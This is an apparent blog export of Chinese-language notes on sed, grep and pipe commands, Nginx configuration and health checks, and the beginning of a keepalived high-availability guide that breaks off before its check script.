<h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><h4 id="基本用法-5"><a href="#基本用法-5" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将文件中的某个字符串替换为另一个字符串。</span></span><br><span class="line">sed &#x27;s/old_text/new_text/&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认情况下，sed 只替换每行中第一个匹配的字符串。如果要替换所有匹配的字符串，可以使用 g 选项</span></span><br><span class="line">sed &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除文件中包含特定字符串的行。</span></span><br><span class="line">sed &#x27;/pattern/d&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除文件中的所有空白行。</span></span><br><span class="line">sed &#x27;/^$/d&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在第2行前插入 new_line_text。</span></span><br><span class="line">sed &#x27;2i\new_line_text&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在第2行后插入 new_line_text。</span></span><br><span class="line">sed &#x27;2a\new_line_text&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将第2行替换为 new_line_text。</span></span><br><span class="line">sed &#x27;2c\new_line_text&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印第2行。</span></span><br><span class="line">sed -n &#x27;2p&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除 file.txt 中的所有数字.</span></span><br><span class="line">sed &#x27;s/[0-9]*//g&#x27; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认情况下，sed 不会修改原文件，而是将结果输出到标准输出。如果要直接修改原文件，可以使用 -i 选项</span></span><br><span class="line">sed -i &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 -i 选项时，可以指定备份文件的扩展名，以便在修改前备份原文件。</span></span><br><span class="line">sed -i.bak &#x27;s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以一次性处理多个文件。</span></span><br><span class="line">sed &#x27;s/old_text/new_text/g&#x27; file1.txt file2.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以将 sed 命令写入脚本文件，然后通过 -f 选项执行。</span></span><br><span class="line">sed -f script.sed filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">替换第2行到第5行中的 old_text 为 new_text。</span></span><br><span class="line">sed &#x27;2,5s/old_text/new_text/g&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在匹配 pattern 的行的下一行中，将 old_text 替换为 new_text。</span></span><br><span class="line">sed &#x27;/pattern/&#123;n;s/old_text/new_text/&#125;&#x27; filename</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在脚本中使用变量时，可以使用双引号而不是单引号。</span></span><br><span class="line">var=&quot;new_text&quot;</span><br><span class="line">sed &quot;s/old_text/$var/g&quot; filename</span><br></pre></td></tr></table></figure>
<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><h4 id="基本用法-6"><a href="#基本用法-6" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;hello&quot;</span>，忽略大小写</span></span><br><span class="line">grep &quot;hello&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;hello&quot;</span>，忽略大小写</span></span><br><span class="line">grep -i &quot;hello&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出不包含 <span class="string">&quot;error&quot;</span> 的行</span></span><br><span class="line">grep -v &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;error&quot;</span> 并显示行号</span></span><br><span class="line">grep -n &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计包含 <span class="string">&quot;warning&quot;</span> 的行数</span></span><br><span class="line">grep -c &quot;warning&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归搜索目录中所有文件，查找 <span class="string">&quot;main&quot;</span></span></span><br><span class="line">grep -r &quot;main&quot; /path/to/directory</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索单词 <span class="string">&quot;test&quot;</span>（不会匹配 <span class="string">&quot;testing&quot;</span> 或 <span class="string">&quot;mytest&quot;</span>）</span></span><br><span class="line">grep -w &quot;test&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;error&quot;</span> 或 <span class="string">&quot;warning&quot;</span></span></span><br><span class="line">grep -E &quot;error|warning&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">高亮显示匹配的 <span class="string">&quot;error&quot;</span></span></span><br><span class="line">grep --color &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示匹配行及其前后 2 行</span></span><br><span class="line">grep -C 2 &quot;error&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只显示包含 <span class="string">&quot;error&quot;</span> 的文件名</span></span><br><span class="line">grep -l &quot;error&quot; *.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从管道中读取数据并搜索</span></span><br><span class="line">cat file.txt | grep &quot;hello&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索以 <span class="string">&quot;start&quot;</span> 开头的行</span></span><br><span class="line">grep &quot;^start&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索以 <span class="string">&quot;end&quot;</span> 结尾的行</span></span><br><span class="line">grep &quot;end$&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索包含 <span class="string">&quot;error&quot;</span> 或 <span class="string">&quot;warning&quot;</span> 的行</span></span><br><span class="line">grep -E &quot;error|warning&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索包含数字的行</span></span><br><span class="line">grep &quot;[0-9]&quot; file.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找所有 .<span class="built_in">log</span> 文件并搜索 <span class="string">&quot;error&quot;</span></span></span><br><span class="line">find /path/to/directory -name &quot;*.log&quot; -exec grep &quot;error&quot; &#123;&#125; \;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找所有 .txt 文件并搜索 <span class="string">&quot;hello&quot;</span></span></span><br><span class="line">find /path/to/directory -name &quot;*.txt&quot; | xargs grep &quot;hello&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 <span class="string">&quot;error&quot;</span>，但排除 .bak 文件</span></span><br><span class="line">grep -r &quot;error&quot; --exclude=&quot;*.bak&quot; /path/to/directory</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在二进制文件中搜索字符串</span></span><br><span class="line">grep -a &quot;string&quot; binaryfile</span><br></pre></td></tr></table></figure>
<h3 id="通道符（-）"><a href="#通道符（-）" class="headerlink" title="通道符（|）"></a>通道符（|）</h3><h4 id="基本用法-7"><a href="#基本用法-7" class="headerlink" title="基本用法"></a>基本用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计文件行数</span></span><br><span class="line">cat file.txt | wc -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找特定进程</span></span><br><span class="line">ps aux | grep nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">排序并去重</span></span><br><span class="line">sort file.txt | uniq</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分页查看长输出</span></span><br><span class="line">ls -l /usr/bin | less</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计单词频率</span></span><br><span class="line">cat file.txt | tr &#x27; &#x27; &#x27;\n&#x27; | sort | uniq -c | sort -nr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找大文件</span></span><br><span class="line">find /var/log -type f -size +100M | xargs ls -lh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">压缩日志文件</span></span><br><span class="line">cat access.log | gzip &gt; access.log.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实时监控日志</span></span><br><span class="line">tail -f /var/log/syslog | grep error</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">计算目录大小</span></span><br><span class="line">du -sh /home | cut -f1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量重命名文件</span></span><br><span class="line">ls *.txt | sed &#x27;s/\(.*\)\.txt/mv &amp; \1.doc/&#x27; | sh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx总结一【常规配置】</title>
    <url>/cnblogs.github.io/p/21237.html</url>
    <content><![CDATA[<h4 id="基础-HTTP-服务配置"><a href="#基础-HTTP-服务配置" class="headerlink" title="基础 HTTP 服务配置"></a>基础 HTTP 服务配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;                  # 监听 80 端口（HTTP）</span><br><span class="line">    server_name example.com;    # 域名或 IP</span><br><span class="line">    root /var/www/html;         # 静态文件根目录</span><br><span class="line">    index index.html index.htm; # 默认索引文件</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri $uri/ =404; # 优先匹配文件，再匹配目录，否则返回 404</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="反向代理配置"><a href="#反向代理配置" class="headerlink" title="反向代理配置"></a>反向代理配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://localhost:3000;  # 将请求转发到本地的 3000 端口（如 Node.js 应用）</span><br><span class="line">        proxy_set_header Host $host;       # 传递原始请求头</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    upstream backend &#123;          # 定义后端服务器组</span><br><span class="line">        server 10.0.0.1:80 weight=3;  # 权重 3（更高优先级）</span><br><span class="line">        server 10.0.0.2:80;</span><br><span class="line">        server 10.0.0.3:80 backup;    # 备用服务器（当其他服务器宕机时启用）</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name example.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backend;  # 请求转发到后端组</span><br><span class="line">            # 可选负载均衡算法：轮询（默认）、weight、ip_hash（会话保持）、least_conn（最少连接）等</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SSL-配置（HTTPS）"><a href="#SSL-配置（HTTPS）" class="headerlink" title="SSL 配置（HTTPS）"></a>SSL 配置（HTTPS）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name example.com;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /etc/nginx/ssl/example.com.crt;    # SSL 证书路径</span><br><span class="line">    ssl_certificate_key /etc/nginx/ssl/example.com.key; # 私钥路径</span><br><span class="line"></span><br><span class="line">    # 推荐 SSL 协议和加密套件</span><br><span class="line">    ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /var/www/html;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 强制 HTTP 跳转到 HTTPS</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name example.com;</span><br><span class="line">    return 301 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="静态文件缓存优化"><a href="#静态文件缓存优化" class="headerlink" title="静态文件缓存优化"></a>静态文件缓存优化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ &#123;</span><br><span class="line">        expires 7d;          # 客户端缓存 7 天</span><br><span class="line">        add_header Cache-Control &quot;public&quot;;</span><br><span class="line">        access_log off;      # 可选：关闭此类请求的日志</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="重定向与重写规则"><a href="#重定向与重写规则" class="headerlink" title="重定向与重写规则"></a>重定向与重写规则</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 301 永久重定向</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name old-domain.com;</span><br><span class="line">    return 301 https://new-domain.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># URL 重写（如隐藏 .php 扩展）</span><br><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        rewrite ^/user/(\d+) /user.php?id=$1 last; # 将 /user/123 重写为 /user.php?id=123</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 限制 IP 访问</span><br><span class="line">location /admin &#123;</span><br><span class="line">    allow 192.168.1.0/24;  # 允许特定 IP 段</span><br><span class="line">    deny all;               # 拒绝其他所有 IP</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 基础认证（用户名/密码）</span><br><span class="line">location /private &#123;</span><br><span class="line">    auth_basic &quot;Restricted Area&quot;;</span><br><span class="line">    auth_basic_user_file /etc/nginx/.htpasswd;  # 使用 htpasswd 生成的文件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                    &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                    &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log /var/log/nginx/access.log main;  # 访问日志路径及格式</span><br><span class="line">    error_log /var/log/nginx/error.log warn;    # 错误日志级别（warn、error、crit 等）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Gzip-压缩"><a href="#Gzip-压缩" class="headerlink" title="Gzip 压缩"></a>Gzip 压缩</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    gzip on;                 # 开启 Gzip</span><br><span class="line">    gzip_types text/plain text/css application/json application/javascript text/xml application/xml image/svg+xml;</span><br><span class="line">    gzip_min_length 1024;    # 最小压缩文件大小</span><br><span class="line">    gzip_comp_level 6;       # 压缩级别（1-9）</span><br><span class="line">    gzip_vary on;            # 根据请求头 Vary: Accept-Encoding 启用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="跨域配置（CORS）"><a href="#跨域配置（CORS）" class="headerlink" title="跨域配置（CORS）"></a>跨域配置（CORS）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /api &#123;</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Origin&#x27; &#x27;*&#x27;;              # 允许所有域名（生产环境建议指定域名）</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Methods&#x27; &#x27;GET, POST, OPTIONS&#x27;;</span><br><span class="line">    add_header &#x27;Access-Control-Allow-Headers&#x27; &#x27;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="转发websocket协议"><a href="#转发websocket协议" class="headerlink" title="转发websocket协议"></a>转发websocket协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 客户端请求的url中端口后面需携带/websocket（也可以自定义匹配规则），这样才会被nginx匹配成功，匹配成功后通过proxy_pass 转发到后端的ip 为192.168.100.33，端口为6000的机器，协议需为http。</span><br><span class="line"># websocket协议是基于http协议与服务端建立长连接的，在协议要求上需要使用1.1的版本，另外需要设置 proxy_set_header Upgrade $http_upgrade ，proxy_set_header Connection &quot;upgrade&quot;，这几点尤为重要。</span><br><span class="line"></span><br><span class="line">location ~ /websocket &#123;</span><br><span class="line">    proxy_pass 网页链接;</span><br><span class="line">    proxy_set_header  Host $host;</span><br><span class="line">    proxy_set_header  X-Real-IP  $remote_addr;</span><br><span class="line">    proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header  X-Forwarded-Proto   $scheme;</span><br><span class="line">    proxy_http_version 1.1;</span><br><span class="line">    proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">    proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="配置websocket-https代理"><a href="#配置websocket-https代理" class="headerlink" title="配置websocket https代理"></a>配置websocket https代理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 很多时候我们访问服务端接口需要使用https的方式，比如微信小程序嵌入H5页面，地址必须是https。如果里面用到websocket的话，也同样必须是经过SSL认证的wss协议。</span><br><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name test.example.com;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /certs/cert.pem;</span><br><span class="line">    ssl_certificate_key /certs/cert.key;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8082;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /ws &#123; </span><br><span class="line">        # 升级协议头 websocket</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;   </span><br><span class="line">        proxy_set_header Connection upgrade;</span><br><span class="line">        #转发到ws服务器</span><br><span class="line">        proxy_pass http://127.0.0.1:8082; </span><br><span class="line">        #------对请求头等的一些设置，可根据情况进行配置------</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real_IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $remote_addr:$remote_port;</span><br><span class="line">        #关闭重定向</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        client_max_body_size 50m;</span><br><span class="line">        proxy_connect_timeout 600;</span><br><span class="line">        proxy_read_timeout 600;</span><br><span class="line">        proxy_send_timeout 600;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 这样，我们就可以使用wss://test.example.com/ws/xxx来连接websocket服务端了！</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx总结三【健康检查机制】</title>
    <url>/cnblogs.github.io/p/c60c.html</url>
    <content><![CDATA[<h3 id="一、被动健康检查（Passive-Health-Checks）"><a href="#一、被动健康检查（Passive-Health-Checks）" class="headerlink" title="一、被动健康检查（Passive Health Checks）"></a>一、被动健康检查（Passive Health Checks）</h3><p><strong>原理</strong><br>通过监控客户端请求的 实际响应结果 自动屏蔽故障节点。当请求失败达到阈值时，Nginx 暂时将故障服务器移出负载均衡池，避免后续请求继续发送到该节点。</p>
<p><strong>核心参数</strong></p>
<ul>
<li>max_fails: 在 fail_timeout 时间窗口内允许的最大失败次数（默认 1）。</li>
<li>fail_timeout: 包含两个含义： 统计失败次数的窗口时间（如 30s 内）。 服务器被屏蔽的持续时间（默认 10s）。</li>
</ul>
<p><strong>配置示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    server backend1.example.com max_fails=3 fail_timeout=30s;</span><br><span class="line">    server backend2.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>行为：若 backend1 在 30 秒内连续失败 3 次，Nginx 将其标记为不可用并暂停转发请求 30 秒。</li>
<li>注意：单服务器组中参数无效（无备用节点可切换）。</li>
</ul>
<h3 id="二、主动健康检查（Active-Health-Checks）（NGINX-Plus-专属）"><a href="#二、主动健康检查（Active-Health-Checks）（NGINX-Plus-专属）" class="headerlink" title="二、主动健康检查（Active Health Checks）（NGINX Plus 专属）"></a>二、主动健康检查（Active Health Checks）（NGINX Plus 专属）</h3><p><strong>原理</strong><br>定期向服务器发送 独立探活请求，主动检测节点健康状态。支持自定义检测条件（如状态码、响应头、响应体）。</p>
<p><strong>基础配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    upstream backend &#123;</span><br><span class="line">        zone backend 64k;  # 共享内存区，用于多进程同步状态</span><br><span class="line">        server backend1.example.com;</span><br><span class="line">        server backend2.example.com;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backend;</span><br><span class="line">            health_check;  # 默认每5秒检测一次根路径&quot;/&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>默认规则：每 5 秒发送 GET &#x2F; 请求，响应状态码为 200-399 则标记为健康。</li>
</ul>
<p><strong>高级参数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">health_check interval=10s fails=3 passes=2 port=8080 uri=/health;</span><br></pre></td></tr></table></figure>
<ul>
<li>interval: 检测间隔时间（默认 5s）。</li>
<li>fails: 标记节点故障需连续失败次数（默认 1）。</li>
<li>passes: 节点恢复需连续成功次数（默认 1）。</li>
<li>port: 指定检测端口（如 8080）。</li>
<li>uri: 自定义探活路径（如 &#x2F;health）。</li>
</ul>
<h3 id="三、慢启动（Slow-Start）（NGINX-Plus-专属）"><a href="#三、慢启动（Slow-Start）（NGINX-Plus-专属）" class="headerlink" title="三、慢启动（Slow Start）（NGINX Plus 专属）"></a>三、慢启动（Slow Start）（NGINX Plus 专属）</h3><p><strong>应用场景</strong><br>防止故障恢复的服务器被瞬间流量压垮。通过逐步增加权重，让服务器在恢复后缓慢承接流量。</p>
<p><strong>配置示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    server backend1.example.com slow_start=30s;  # 30秒内权重从0恢复至正常值</span><br><span class="line">    server backend2.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>行为：backend1 恢复后，30 秒内从零开始逐步增加流量负载。</li>
</ul>
<h3 id="四、自定义健康条件（Custom-Conditions）（NGINX-Plus-专属）"><a href="#四、自定义健康条件（Custom-Conditions）（NGINX-Plus-专属）" class="headerlink" title="四、自定义健康条件（Custom Conditions）（NGINX Plus 专属）"></a>四、自定义健康条件（Custom Conditions）（NGINX Plus 专属）</h3><p>通过 match 块定义复杂的健康判定规则，支持状态码、响应头、响应体匹配。</p>
<p><strong>示例：检测特定响应内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    match server_ok &#123;</span><br><span class="line">        status 200-399;              # 状态码在200-399范围内</span><br><span class="line">        header Content-Type =~ &quot;json&quot;;  # 响应头包含&quot;json&quot;</span><br><span class="line">        body !~ &quot;error&quot;;             # 响应体不包含&quot;error&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backend;</span><br><span class="line">            health_check match=server_ok;  # 应用自定义规则</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="五、强制健康检查（Mandatory-Checks）（NGINX-Plus-专属）"><a href="#五、强制健康检查（Mandatory-Checks）（NGINX-Plus-专属）" class="headerlink" title="五、强制健康检查（Mandatory Checks）（NGINX Plus 专属）"></a>五、强制健康检查（Mandatory Checks）（NGINX Plus 专属）</h3><p><strong>应用场景</strong><br>新加入的服务器（如通过 API 或 DNS 动态添加）必须通过健康检查后才能接收流量。</p>
<p><strong>配置示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    zone backend 64k;</span><br><span class="line">    server backend1.example.com slow_start=30s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://backend;</span><br><span class="line">        health_check mandatory persistent;  # 强制检测 + 持久化状态</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>mandatory: 新服务器必须通过检测才能加入负载均衡。</li>
<li>persistent: 配置重载时保留服务器状态（如之前已健康则跳过检测）。</li>
</ul>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx总结二【高可用（Keepalived）配置】</title>
    <url>/cnblogs.github.io/p/38221.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>操作系统</th>
<th>IP</th>
<th>角色</th>
</tr>
</thead>
<tbody><tr>
<td>centos7</td>
<td>192.168.133.130</td>
<td>vip（虚拟ip）</td>
</tr>
<tr>
<td></td>
<td>192.168.133.131</td>
<td>keepalived+nginx1</td>
</tr>
<tr>
<td></td>
<td>192.168.133.132</td>
<td>keepalived+nginx2）</td>
</tr>
</tbody></table>
<h4 id="安装nginx-略"><a href="#安装nginx-略" class="headerlink" title="安装nginx (略)"></a>安装nginx (略)</h4><h4 id="安装keepalived"><a href="#安装keepalived" class="headerlink" title="安装keepalived"></a>安装keepalived</h4><p>yum方式直接安装即可，该方式会自动安装依赖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install keepalived</span><br></pre></td></tr></table></figure>
<p>yum方式安装的会生产配置文件在&#x2F;etc&#x2F;keepalived下：keepalived.conf<br>两台服务器均需要安装keepalived</p>
<h4 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h4><p>1、先准备nginx的检测脚本 cat &#x2F;etc&#x2F;keepalived&#x2F;check_nginx.sh 内容如下</p>
